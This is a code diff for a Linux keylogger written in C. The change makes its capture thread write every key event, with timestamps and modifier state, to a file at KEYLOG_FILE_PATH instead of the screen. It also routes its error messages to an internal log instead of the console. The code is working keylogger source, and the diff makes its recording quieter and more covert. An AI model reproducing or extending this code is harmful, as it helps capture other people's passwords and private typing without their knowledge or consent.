@@ -83,31 +83,32 @@ void update_modifiers(const int code, const int value) {
                 modifiers.capslock = !modifiers.capslock;
             }
             break;
-        default: fprintf(stderr, "Hit Default Case in update_modifiers");
+        default:
+            log_message("Hit Default Case in update_modifiers");
     }
 }
 
 /**
  * Print current modifier state
  */
-void print_modifiers(void) {
-    printf(" [");
-    if (modifiers.shift) printf("SHIFT ");
-    if (modifiers.ctrl) printf("CTRL ");
-    if (modifiers.alt) printf("ALT ");
-    if (modifiers.meta) printf("META ");
-    if (modifiers.capslock) printf("CAPS ");
+static void write_modifiers(FILE * log_file) {
+    fprintf(log_file, " [");
+    if (modifiers.shift)   fprintf(log_file, "SHIFT ");
+    if (modifiers.ctrl)    fprintf(log_file, "CTRL ");
+    if (modifiers.alt)     fprintf(log_file, "ALT ");
+    if (modifiers.meta)    fprintf(log_file, "META ");
+    if (modifiers.capslock) fprintf(log_file, "CAPS ");
     if (!modifiers.shift && !modifiers.ctrl && !modifiers.alt &&
         !modifiers.meta && !modifiers.capslock) {
-        printf("none");
+        fprintf(log_file, "none");
     }
-    printf("]");
+    fprintf(log_file, "]");
 }
 
 /**
- * Print time relative to first event
+ * Write time relative to first event to file
  */
-void print_relative_time(const struct timeval *ev_time) {
+static void write_relative_time(FILE * log_file, const struct timeval * ev_time) {
     char time_buf[32];
 
     if (!start_time_valid) {
@@ -124,12 +125,11 @@ void print_relative_time(const struct timeval *ev_time) {
         snprintf(time_buf, sizeof(time_buf), "+%ld.%06ld", sec_delta, usec_delta);
     }
 
-    printf("%-15s", time_buf);
+    fprintf(log_file, "%-15s", time_buf);
 }
 
 /**
  * Convert event type to string
- * Note: Returns pointer to static buffer for unknown types - don't call multiple times in same printf
  */
 const char* event_type_to_string(const int type) {
     switch(type) {
@@ -308,7 +308,7 @@ int verify_device(const int fd) {
     }
 
     if (!test_bit(EV_KEY, evbit)) {
-        fprintf(stderr, "Error: Device does not support keyboard events (EV_KEY)\n");
+        log_message("Error: Device does not support keyboard events (EV_KEY)");
         return 0;
     }
 
@@ -323,9 +323,7 @@ int verify_device(const int fd) {
     if (!test_bit(KEY_A, keybit) && !test_bit(KEY_Q, keybit) &&
         !test_bit(KEY_ENTER, keybit) && !test_bit(KEY_SPACE, keybit) &&
         !test_bit(KEY_LEFTSHIFT, keybit)) {
-        fprintf(stderr, "Warning: Device has EV_KEY but doesn't look like a keyboard\n");
-        fprintf(stderr, "         (no common keyboard keys found)\n");
-        fprintf(stderr, "         Continuing anyway...\n\n");
+        log_message("Warning: Device has EV_KEY but doesn't look like a keyboard, continuing anyway");
     }
 
     return 1;
@@ -335,12 +333,19 @@ int verify_device(const int fd) {
  * Capture and display key events from device
  */
 void * capture_keys(void * arg) {
-    const struct session_info * session_info = arg;
+    struct session_info * session_info = arg;
     char * device_path = session_info->device_path;
     _Atomic int run_keylogger = session_info->run_keylogger;
 
     if (device_path == NULL) {
         log_message("Device path is null");
+        pthread_exit(NULL);
+    }
+
+    FILE * log_file = fopen(KEYLOG_FILE_PATH, "w");
+    if (log_file == NULL) {
+        log_message("Failed to open keylog file: %s", KEYLOG_FILE_PATH);
+        session_info->run_keylogger = false;
         pthread_exit(NULL);
     }
 
@@ -351,21 +356,25 @@ void * capture_keys(void * arg) {
 
     const int fd = open(device_path, O_RDONLY);
     if (fd < 0) {
-        perror("Error opening device");
-        fprintf(stderr, "Hint: Try running with sudo\n");
+        log_message("Error opening device: %s", device_path);
+        fclose(log_file);
+        session_info->run_keylogger = false;
         return NULL;
     }
 
     if (!verify_device(fd)) {
         close(fd);
+        fclose(log_file);
+        session_info->run_keylogger = false;
         return NULL;
     }
 
-    printf("Capturing key events from: %s\n", device_path);
-    printf("==================================================================================\n");
-    printf("%-15s %-10s %-20s %-15s %-30s\n",
-           "RelTime", "Type", "Code", "Value", "Modifiers");
-    printf("==================================================================================\n");
+    fprintf(log_file, "Capturing key events from: %s\n", device_path);
+    fprintf(log_file, "==================================================================================\n");
+    fprintf(log_file, "%-15s %-10s %-20s %-15s %-30s\n",
+            "RelTime", "Type", "Code", "Value", "Modifiers");
+    fprintf(log_file, "==================================================================================\n");
+    fflush(log_file);
 
     while (run_keylogger) {
         FD_ZERO(&readfds);
@@ -377,10 +386,8 @@ void * capture_keys(void * arg) {
         const int ret = select(fd + 1, &readfds, NULL, NULL, &tv);
 
         if (ret < 0) {
-            if (errno == EINTR) {
-                continue;
-            }
-            perror("select error");
+            if (errno == EINTR) continue;
+            log_message("select error in capture_keys");
             break;
         }
         if (ret == 0) {
@@ -391,17 +398,17 @@ void * capture_keys(void * arg) {
 
         // Handle EOF
         if (n == 0) {
-            fprintf(stderr, "Device closed (EOF)\n");
+            log_message("Device closed (EOF)");
             break;
         }
 
         // Handle short reads
         if (n != sizeof(ev)) {
             if (n < 0) {
-                perror("read error");
+                log_message("read error in capture_keys");
                 break;
             }
-            fprintf(stderr, "Warning: Short read (%zd bytes, expected %zu)\n", n, sizeof(ev));
+            log_message("Warning: Short read (%zd bytes, expected %zu)", n, sizeof(ev));
             continue;
         }
 
@@ -424,56 +431,56 @@ void * capture_keys(void * arg) {
                 last_scan_consumed = 1;
             }
 
-            print_relative_time(&ev.time);
-            printf(" %-10s %-20s %-15s",
-                   event_type_to_string(ev.type),
-                   code_to_string(ev.type, corrected_code),
-                   value_to_string(ev.type, ev.code, ev.value));
+            write_relative_time(log_file, &ev.time);
+            fprintf(log_file, " %-10s %-20s %-15s",
+                    event_type_to_string(ev.type),
+                    code_to_string(ev.type, corrected_code),
+                    value_to_string(ev.type, ev.code, ev.value));
 
-            // Print modifiers BEFORE updating (shows state at time of event)
-            print_modifiers();
+            write_modifiers(log_file);
 
             // Show if we applied a fix (using separate buffers to avoid static buffer collision)
             if (was_fixed) {
                 char raw_buf[32], fixed_buf[32];
-                printf(" [FIXED: %s->%s]",
-                       code_to_string_buf(ev.type, ev.code, raw_buf, sizeof(raw_buf)),
-                       code_to_string_buf(ev.type, corrected_code, fixed_buf, sizeof(fixed_buf)));
+                fprintf(log_file, " [FIXED: %s->%s]",
+                        code_to_string_buf(ev.type, ev.code, raw_buf, sizeof(raw_buf)),
+                        code_to_string_buf(ev.type, corrected_code, fixed_buf, sizeof(fixed_buf)));
             }
 
-            printf("\n");
-            fflush(stdout);
+            fprintf(log_file, "\n");
+            fflush(log_file);
 
             // Update modifiers AFTER printing for next event
             update_modifiers(corrected_code, ev.value);
 
             printed_since_syn = 1;
+
         } else if (ev.type == EV_SYN && ev.code == SYN_REPORT) {
             // Only print event boundary if we've printed KEY events since last boundary
             if (printed_since_syn) {
-                print_relative_time(&ev.time);
-                printf(" %-10s %-20s %-15s [---event boundary---]\n",
-                       event_type_to_string(ev.type),
-                       code_to_string(ev.type, ev.code),
-                       value_to_string(ev.type, ev.code, ev.value));
-                fflush(stdout);
+                write_relative_time(log_file, &ev.time);
+                fprintf(log_file, " %-10s %-20s %-15s [---event boundary---]\n",
+                        event_type_to_string(ev.type),
+                        code_to_string(ev.type, ev.code),
+                        value_to_string(ev.type, ev.code, ev.value));
+                fflush(log_file);
                 printed_since_syn = 0;
             }
         } else {
-            // Other events (MSC, LED, etc.) - don't trigger boundary markers
-            print_relative_time(&ev.time);
-            printf(" %-10s %-20s %-15s\n",
-                   event_type_to_string(ev.type),
-                   code_to_string(ev.type, ev.code),
-                   value_to_string(ev.type, ev.code, ev.value));
-            fflush(stdout);
-            // Don't set printed_since_syn for non-KEY events
+            write_relative_time(log_file, &ev.time);
+            fprintf(log_file, " %-10s %-20s %-15s\n",
+                    event_type_to_string(ev.type),
+                    code_to_string(ev.type, ev.code),
+                    value_to_string(ev.type, ev.code, ev.value));
+            fflush(log_file);
         }
+
         run_keylogger = session_info->run_keylogger;
     }
 
     close(fd);
-    printf("\nCapture stopped.\n");
+    fprintf(log_file, "\nCapture stopped.\n");
+    fclose(log_file);
 
     free(device_path);
     return NULL;
